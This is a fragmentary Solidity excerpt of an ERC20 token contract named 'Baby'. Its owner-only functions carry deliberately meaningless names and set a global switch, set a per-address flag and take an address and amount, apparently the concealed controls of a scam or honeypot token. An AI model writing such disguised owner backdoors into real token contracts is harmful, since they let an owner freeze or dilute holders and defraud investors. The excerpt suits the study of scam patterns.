...
contract Baby is Context, IERC20, Ownable {
    ...
    bool public qwer = true;
    mapping (address => bool) public qwerty;
    ...
    function wqghj(address account, uint256 amount) onlyOwner() public {
    ...
    function kgserf(bool _status) public onlyOwner {
        qwer = _status;
    }

    function adfgyh(address addre, bool status) public onlyOwner {
        qwerty[addre]  = status;
    }
